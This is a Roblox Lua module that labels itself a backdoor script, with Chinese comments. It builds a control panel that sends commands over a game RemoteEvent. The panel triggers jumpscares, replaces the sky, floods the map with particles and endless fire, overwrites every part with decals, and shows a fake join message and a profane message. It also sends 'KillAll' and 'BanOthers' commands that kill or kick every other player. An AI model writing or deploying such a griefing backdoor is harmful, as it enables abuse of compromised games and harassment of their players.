-- ReplicatedStorage > BackdoorScripts > ParticleFireHack
-- 粒子火焰后门脚本 - 全图粒子 + 一键逃逸 + 持久化 + 文字提示 + 击杀踢人版

local module = {}

function module:Execute()
	local player = game.Players.LocalPlayer
	local playerGui = player:WaitForChild("PlayerGui")

	-- ========== Roblox资产ID配置 ==========
	local ASSETS = {
		menu_image = "rbxassetid://2916438512",
		scare1 = "rbxassetid://112937015634048",
		scare1_bgm = "rbxassetid://9069609200",
		scare2 = "rbxassetid://90782809068040",
		scare23_bgm = "rbxassetid://140505775566543",
		sky = "rbxassetid://78144542857439",
		sky2 = "rbxassetid://16478262700",
		jumpstyle_bgm = "rbxassetid://121574866916656",
		particle1 = "rbxassetid://100630308609454",
		particle2 = "rbxassetid://4019338479",
		wp = "rbxassetid://131335899867681",
		wp2 = "rbxassetid://112937015634048"
	}
	-- ====================================

	-- 获取服务器同步用的RemoteEvent
	local RunScript = game.ReplicatedStorage.Remotes.RunScript

	-- 创建主GUI
	local main = Instance.new("ScreenGui")
	main.Name = "main"
	main.Parent = playerGui
	main.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
	main.ResetOnSpawn = false

	local Frame = Instance.new("Frame")
	Frame.Parent = main
	Frame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
	Frame.Position = UDim2.new(0.15, 0, 0.15, 0)
	Frame.Size = UDim2.new(0, 580, 0, 400)
	Frame.Active = true
	Frame.Draggable = true

	local menuImage = Instance.new("ImageLabel")
	menuImage.Parent = Frame
	menuImage.Size = UDim2.new(1, 0, 1, 0)
	menuImage.Position = UDim2.new(0, 0, 0, 0)
	menuImage.Image = ASSETS.menu_image
	menuImage.BackgroundTransparency = 1

	local closeButton = Instance.new("TextButton")
	closeButton.Parent = Frame
	closeButton.Size = UDim2.new(0, 30, 0, 30)
	closeButton.Position = UDim2.new(1, -30, 0, 0)
	closeButton.Text = "X"
	closeButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
	closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
	closeButton.Font = Enum.Font.SourceSansBold
	closeButton.TextSize = 20

	closeButton.MouseButton1Click:Connect(function()
		main:Destroy()
	end)

	-- ========== 发送效果到服务器的函数 ==========
	local function syncToServer(effectType, assetId, extraData)
		RunScript:FireServer("SyncEffect", effectType, assetId, extraData)
	end

	-- ========== 接收服务器同步过来的效果 ==========
	RunScript.OnClientEvent:Connect(function(action, effectType, assetId, extraData)
		if action == "ClearEffects" then
			print("清除所有效果请求")
			return
		end

		if action == "ShowPrompt" then
			-- 在屏幕最上面显示文字
			local existingPrompt = playerGui:FindFirstChild("BackdoorPrompt")
			if existingPrompt then existingPrompt:Destroy() end

			local promptGui = Instance.new("ScreenGui")
			promptGui.Name = "BackdoorPrompt"
			promptGui.Parent = playerGui
			promptGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
			promptGui.ResetOnSpawn = false

			local promptLabel = Instance.new("TextLabel")
			promptLabel.Parent = promptGui
			promptLabel.Size = UDim2.new(1, 0, 0, 40)
			promptLabel.Position = UDim2.new(0, 0, 0, 0)
			promptLabel.BackgroundTransparency = 1
			promptLabel.Text = effectType -- 文字内容
			promptLabel.TextColor3 = assetId == "Red" and Color3.fromRGB(255, 0, 0) or Color3.fromRGB(0, 100, 255)
			promptLabel.Font = Enum.Font.SourceSansBold
			promptLabel.TextSize = 24
			promptLabel.ZIndex = 100
			promptLabel.TextStrokeTransparency = 0
			promptLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)

			-- 5秒后自动消失
			spawn(function()
				wait(5)
				if promptGui then promptGui:Destroy() end
			end)
			return
		end

		if action ~= "PlayEffect" then return end

		if effectType == "Scare" then
			local imageGui = Instance.new("ScreenGui")
			imageGui.Parent = playerGui
			imageGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
			local imageLabel = Instance.new("ImageLabel")
			imageLabel.Parent = imageGui
			imageLabel.Size = UDim2.new(1, 0, 1, 0)
			imageLabel.Image = assetId
			imageLabel.BackgroundTransparency = 1
			imageLabel.ZIndex = 10

			local sound = Instance.new("Sound")
			sound.SoundId = extraData
			sound.Parent = workspace
			sound.Volume = 1
			sound:Play()

			spawn(function()
				wait(extraData == ASSETS.scare1_bgm and 10 or 6)
				if imageGui then imageGui:Destroy() end
				if sound then pcall(function() sound:Stop() sound:Destroy() end) end
			end)

		elseif effectType == "Sky" then
			local oldSky = game.Lighting:FindFirstChildOfClass("Sky")
			if oldSky then oldSky:Destroy() end
			local skybox = Instance.new("Sky")
			skybox.SkyboxBk = assetId
			skybox.SkyboxDn = assetId
			skybox.SkyboxFt = assetId
			skybox.SkyboxLf = assetId
			skybox.SkyboxRt = assetId
			skybox.SkyboxUp = assetId
			skybox.Parent = game.Lighting

		elseif effectType == "ParticlePlayer" then
			local char = player.Character
			if not char then return end
			local head = char:FindFirstChild("Head")
			if not head then return end

			local emit = Instance.new("ParticleEmitter")
			emit.Parent = head
			emit.Texture = assetId
			emit.Rate = 800
			emit.Lifetime = NumberRange.new(999999, 999999)
			emit.Speed = NumberRange.new(30, 80)
			emit.SpreadAngle = Vector2.new(360, 360)
			emit.VelocitySpread = 100000
			emit.Acceleration = Vector3.new(0, 0, 0)
			emit.Drag = 0
			emit.RotSpeed = NumberRange.new(-200, 200)
			emit.LockedToPart = false

		elseif effectType == "ParticlePlayerOnly" then
			local char = player.Character
			if not char then return end
			local head = char:FindFirstChild("Head")
			if not head then return end

			local emit = Instance.new("ParticleEmitter")
			emit.Parent = head
			emit.Texture = assetId
			emit.Rate = 800
			emit.Lifetime = NumberRange.new(999999, 999999)
			emit.Speed = NumberRange.new(30, 80)
			emit.SpreadAngle = Vector2.new(360, 360)
			emit.VelocitySpread = 100000
			emit.Acceleration = Vector3.new(0, 0, 0)
			emit.Drag = 0
			emit.RotSpeed = NumberRange.new(-200, 200)
			emit.LockedToPart = false

		elseif effectType == "ParticleWorld" then
			local existingParticles = 0
			for _, obj in ipairs(workspace:GetDescendants()) do
				if obj:IsA("ParticleEmitter") and obj.Name == "WorldParticle" then
					existingParticles = existingParticles + 1
				end
			end

			if existingParticles > 0 then
				print("全图粒子已存在（" .. existingParticles .. " 个），跳过重复创建")
				return
			end

			local objects = workspace:GetDescendants()
			local count = 0
			for _, obj in ipairs(objects) do
				if obj:IsA("BasePart") and not obj:IsA("Terrain") then
					if math.random(1, 100) <= 50 then
						pcall(function()
							local emit = Instance.new("ParticleEmitter")
							emit.Name = "WorldParticle"
							emit.Parent = obj
							emit.Texture = assetId
							emit.Rate = 200
							emit.Lifetime = NumberRange.new(999999, 999999)
							emit.Speed = NumberRange.new(10, 40)
							emit.SpreadAngle = Vector2.new(360, 360)
							emit.VelocitySpread = 50000
							emit.Acceleration = Vector3.new(0, 5, 0)
							emit.Drag = 0.5
							emit.RotSpeed = NumberRange.new(-100, 100)
							emit.LockedToPart = false
							count = count + 1
						end)
					end
				end
			end
			print("全图粒子已创建在 " .. count .. " 个物体上")

		elseif effectType == "WP" then
			for _, obj in ipairs(workspace:GetDescendants()) do
				if obj:IsA("BasePart") and not obj:IsA("Terrain") then
					pcall(function()
						obj.Material = Enum.Material.Plastic
						obj.Transparency = 0
						local faces = {
							{face = Enum.NormalId.Front},
							{face = Enum.NormalId.Back},
							{face = Enum.NormalId.Right},
							{face = Enum.NormalId.Left},
							{face = Enum.NormalId.Top},
							{face = Enum.NormalId.Bottom}
						}
						for _, f in ipairs(faces) do
							local decal = Instance.new("Decal", obj)
							decal.Texture = assetId
							decal.Face = f.face
						end
					end)
				end
			end

			local existingFires = 0
			for _, obj in ipairs(workspace:GetChildren()) do
				if obj:IsA("Part") and obj:FindFirstChildOfClass("Fire") then
					existingFires = existingFires + 1
				end
			end

			if existingFires > 0 then
				print("火焰风暴已存在（" .. existingFires .. " 个火焰），跳过重复创建")
				return
			end

			spawn(function()
				while true do
					for i = 1, 30 do
						local part = Instance.new("Part")
						part.Position = Vector3.new(math.random(-500, 500), math.random(1, 100), math.random(-500, 500))
						part.Size = Vector3.new(math.random(5, 25), math.random(5, 25), math.random(5, 25))
						part.Anchored = true
						part.CanCollide = false
						part.Transparency = 1
						part.Parent = workspace

						local fire = Instance.new("Fire")
						fire.Size = math.random(30, 80)
						fire.Heat = math.random(20, 50)
						fire.Parent = part

						local light = Instance.new("PointLight")
						light.Parent = part
						light.Brightness = math.random(5, 15)
						light.Range = math.random(30, 60)
						light.Color = Color3.fromRGB(255, math.random(80, 160), 0)
					end
					wait(0.2)
				end
			end)

		elseif effectType == "Music" then
			for _, obj in ipairs(workspace:GetChildren()) do
				if obj:IsA("Sound") and obj.SoundId == assetId and obj.IsPlaying then
					print("音乐已在播放，跳过")
					return
				end
			end

			local sound = Instance.new("Sound")
			sound.SoundId = assetId
			sound.Parent = workspace
			sound.Volume = 1
			sound.Looped = true
			sound:Play()
			print("音乐开始播放")
		end
	end)

	-- ========== 按钮功能 ==========
	local function createButton(parent, name, position, size, color, callback)
		local button = Instance.new("TextButton")
		button.Parent = parent
		button.Position = position
		button.Size = size
		button.BackgroundColor3 = color or Color3.fromRGB(200, 162, 200)
		button.Text = name
		button.TextColor3 = Color3.fromRGB(255, 255, 255)
		button.Font = Enum.Font.SourceSansBold
		button.TextSize = 12
		button.MouseButton1Click:Connect(callback)
		return button
	end

	-- 第一排按钮 - 吓唬
	createButton(Frame, "Jumpscare", UDim2.new(0.02, 0, 0.07, 0), UDim2.new(0, 78, 0, 28), nil, function()
		syncToServer("Scare", ASSETS.scare1, ASSETS.scare1_bgm)
	end)
	createButton(Frame, "Jumpscare2", UDim2.new(0.18, 0, 0.07, 0), UDim2.new(0, 78, 0, 28), nil, function()
		syncToServer("Scare", ASSETS.scare2, ASSETS.scare23_bgm)
	end)
	createButton(Frame, "Jumpscare3", UDim2.new(0.34, 0, 0.07, 0), UDim2.new(0, 78, 0, 28), nil, function()
		syncToServer("Scare", ASSETS.scare2, ASSETS.scare23_bgm)
	end)
	createButton(Frame, "sky", UDim2.new(0.50, 0, 0.07, 0), UDim2.new(0, 55, 0, 28), nil, function()
		syncToServer("Sky", ASSETS.sky, nil)
	end)
	createButton(Frame, "sky2", UDim2.new(0.62, 0, 0.07, 0), UDim2.new(0, 55, 0, 28), nil, function()
		syncToServer("Sky", ASSETS.sky2, nil)
	end)
	createButton(Frame, "Prompt1", UDim2.new(0.74, 0, 0.07, 0), UDim2.new(0, 70, 0, 28), Color3.fromRGB(255, 50, 50), function()
		RunScript:FireServer("ServerPrompt", "z003fii joined the game!", "Red")
	end)
	createButton(Frame, "Prompt2", UDim2.new(0.87, 0, 0.07, 0), UDim2.new(0, 70, 0, 28), Color3.fromRGB(50, 50, 255), function()
		RunScript:FireServer("ServerPrompt", "z003fii fuck your mum!", "Blue")
	end)

	-- 第二排按钮 - 粒子
	createButton(Frame, "Particle1", UDim2.new(0.02, 0, 0.19, 0), UDim2.new(0, 78, 0, 28), nil, function()
		syncToServer("ParticlePlayer", ASSETS.particle1, nil)
	end)
	createButton(Frame, "Particle2", UDim2.new(0.18, 0, 0.19, 0), UDim2.new(0, 78, 0, 28), nil, function()
		syncToServer("ParticlePlayer", ASSETS.particle2, nil)
	end)
	createButton(Frame, "P1 all", UDim2.new(0.34, 0, 0.19, 0), UDim2.new(0, 78, 0, 28), Color3.fromRGB(255, 100, 100), function()
		syncToServer("ParticleWorld", ASSETS.particle1, nil)
	end)
	createButton(Frame, "P2 all", UDim2.new(0.50, 0, 0.19, 0), UDim2.new(0, 78, 0, 28), Color3.fromRGB(255, 100, 100), function()
		syncToServer("ParticleWorld", ASSETS.particle2, nil)
	end)
	createButton(Frame, "Kill all", UDim2.new(0.66, 0, 0.19, 0), UDim2.new(0, 75, 0, 28), Color3.fromRGB(255, 0, 0), function()
		RunScript:FireServer("KillAll")
	end)
	createButton(Frame, "Ban others", UDim2.new(0.80, 0, 0.19, 0), UDim2.new(0, 85, 0, 28), Color3.fromRGB(200, 0, 0), function()
		RunScript:FireServer("BanOthers")
	end)

	-- 第三排按钮 - WP
	createButton(Frame, "666", UDim2.new(0.02, 0, 0.31, 0), UDim2.new(0, 78, 0, 28), Color3.fromRGB(100, 255, 100), function()
		syncToServer("WP", ASSETS.wp, nil)
	end)
	createButton(Frame, "777", UDim2.new(0.18, 0, 0.31, 0), UDim2.new(0, 78, 0, 28), Color3.fromRGB(100, 255, 100), function()
		syncToServer("WP", ASSETS.wp2, nil)
	end)
	createButton(Frame, "Music", UDim2.new(0.34, 0, 0.31, 0), UDim2.new(0, 78, 0, 28), Color3.fromRGB(100, 150, 255), function()
		syncToServer("Music", ASSETS.jumpstyle_bgm, nil)
	end)
	createButton(Frame, "StopMusic", UDim2.new(0.50, 0, 0.31, 0), UDim2.new(0, 78, 0, 28), Color3.fromRGB(150, 150, 150), function()
		for _, obj in ipairs(workspace:GetChildren()) do
			if obj:IsA("Sound") then
				obj:Stop()
				obj:Destroy()
			end
		end
	end)

	-- 第四排按钮 - 逃逸
	createButton(Frame, "EscapeAll", UDim2.new(0.02, 0, 0.44, 0), UDim2.new(0, 500, 0, 35), Color3.fromRGB(255, 80, 80), function()
		RunScript:FireServer("EscapeMe")
		main:Destroy()
	end)

	-- 说明文字
	local infoLabel = Instance.new("TextLabel")
	infoLabel.Parent = Frame
	infoLabel.Position = UDim2.new(0.02, 0, 0.55, 0)
	infoLabel.Size = UDim2.new(0, 500, 0, 40)
	infoLabel.Text = "Prompt:全屏提示 | Kill:击杀除己外玩家 | Ban:踢出除己外玩家 | Escape:踢出自己"
	infoLabel.BackgroundTransparency = 1
	infoLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
	infoLabel.Font = Enum.Font.SourceSansBold
	infoLabel.TextSize = 10
	infoLabel.TextWrapped = true

	-- 最小化功能
	local isMinimized = false
	local minimizeButton = Instance.new("TextButton")
	minimizeButton.Parent = Frame
	minimizeButton.Size = UDim2.new(0, 30, 0, 30)
	minimizeButton.Position = UDim2.new(1, -60, 0, 0)
	minimizeButton.Text = "-"
	minimizeButton.BackgroundColor3 = Color3.fromRGB(255, 255, 0)
	minimizeButton.TextColor3 = Color3.fromRGB(0, 0, 0)
	minimizeButton.Font = Enum.Font.SourceSansBold
	minimizeButton.TextSize = 20

	local allButtons = {}
	for _, child in pairs(Frame:GetChildren()) do
		if child:IsA("TextButton") and child ~= closeButton and child ~= minimizeButton then
			table.insert(allButtons, child)
		end
	end

	minimizeButton.MouseButton1Click:Connect(function()
		isMinimized = not isMinimized
		if isMinimized then
			for _, button in pairs(allButtons) do button.Visible = false end
			infoLabel.Visible = false
			Frame.Size = UDim2.new(0, 580, 0, 40)
			menuImage.Visible = false
		else
			for _, button in pairs(allButtons) do button.Visible = true end
			infoLabel.Visible = true
			Frame.Size = UDim2.new(0, 580, 0, 400)
			menuImage.Visible = true
		end
	end)

	print("后门GUI已激活 - 玩家：" .. player.Name)
end

return module
